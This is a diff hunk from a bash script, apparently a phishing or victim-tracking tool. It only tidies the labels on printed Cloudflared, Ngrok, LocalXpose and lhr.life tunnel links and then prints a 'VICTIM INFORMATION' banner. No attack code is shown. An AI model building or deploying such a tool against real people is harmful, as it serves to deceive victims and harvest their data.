@@ -803,15 +803,15 @@ all_links() {
                            echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo -e " "
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                     
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared :\e[0m\e[1;77m %s\e[0m\n" $clink                     
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                    
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                  
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                       
+                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                       
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33mLocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m    "                     
+                           printf "\e[1;33m\e[0m\e[1;33m LocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m "                     
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
